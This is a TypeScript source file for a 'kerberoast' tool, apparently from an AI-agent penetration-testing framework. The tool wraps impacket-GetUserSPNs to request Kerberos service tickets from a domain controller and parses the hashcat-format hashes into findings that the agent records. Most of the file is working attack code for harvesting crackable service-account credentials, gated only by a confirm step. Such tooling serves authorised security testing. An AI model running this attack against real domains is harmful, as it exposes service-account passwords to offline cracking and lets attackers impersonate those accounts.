/**
 * v0.4-B — `kerberoast` tool. Wraps `impacket-GetUserSPNs` to
 * request Kerberos TGS tickets for accounts with SPNs registered
 * (service accounts) and emit them in hashcat-format for offline
 * cracking. Pre-auth — no credentials needed for the enumeration
 * step itself, but a valid user is required (anonymous binds are
 * typically disabled on modern DCs).
 *
 * Chokepoint contract: same as `psexec` (see `./psexec.ts`).
 *
 * Output: stdout contains `krb5tgs$23$*user$realm$spn*$hash$hash`
 * lines, one per crackable service account.
 */

import { z } from 'zod';
import { run } from '../shared/runner.js';
import type { Tool, ToolContext } from '@gmft/core';
import {
  AdInputBase,
  AdOutputBase,
  AD_IMAGE,
  buildImpacketTarget,
  defaultAdFindings,
} from './shared.js';

export const KerberoastInput = AdInputBase.merge(
  z.object({
    /** Request tickets (not just enumerate SPNs). Default true. */
    request: z.boolean().optional(),
    /** Output format. Default `hashcat` for offline cracking. */
    format: z.enum(['hashcat', 'john']).optional(),
  }),
);
export type KerberoastInputT = z.infer<typeof KerberoastInput>;

export const KerberoastOutput = AdOutputBase;
export type KerberoastOutputT = z.infer<typeof KerberoastOutput>;

/**
 * Parse one or more `$krb5tgs$...` hashcat-format lines from
 * impacket-GetUserSPNs output. Returns one Finding per account so
 * the agent can auto-append them to the FindingsStore with
 * severity `high` (cracked service accounts grant impersonation
 * of the SPN owner).
 *
 * The leading `$` is optional: impacket v0.12 emits `$krb5tgs$...`,
 * but earlier versions and some hashcat tooling emit `krb5tgs$...`
 * without the prefix. We match both for forward-compat.
 */
const KRB5TGS_LINE = /\$?krb5tgs\$\d+\$[^\s]+/g;

export function parseKerberoastHashes(stdout: string): string[] {
  return stdout.match(KRB5TGS_LINE) ?? [];
}

export function buildKerberoastArgs(input: KerberoastInputT): string[] {
  const target = buildImpacketTarget(input);
  const argv = ['impacket-GetUserSPNs'];
  if (input.request !== false) argv.push('-request');
  if (input.format && input.format !== 'hashcat') argv.push('-format', input.format);
  argv.push(target);
  return argv;
}

export const kerberoastTool: Tool<
  typeof KerberoastInput,
  typeof KerberoastOutput
> = {
  name: 'kerberoast',
  category: 'ad',
  flags: ['destructive', 'targetRequired'],
  typeToConfirm: 'attack',
  description:
    'Request TGS tickets for SPN-bearing accounts via impacket-GetUserSPNs. ' +
    'Output is hashcat-format hashes ready for offline cracking.',
  input: KerberoastInput,
  output: KerberoastOutput,
  async run(
    input: KerberoastInputT,
    _ctx: ToolContext,
  ): Promise<KerberoastOutputT> {
    const parsed = KerberoastInput.parse(input);
    const argv = buildKerberoastArgs(parsed);
    const r = await run({ argv, image: AD_IMAGE, timeoutMs: 120_000 });
    return {
      stdout: r.stdout,
      stderr: r.stderr,
      exitCode: r.exitCode,
      durationMs: r.durationMs,
      mode: r.mode,
      fellBack: r.fellBack,
      findings: [...defaultAdFindings(r.stdout), ...parseKerberoastHashes(r.stdout)],
    };
  },
};
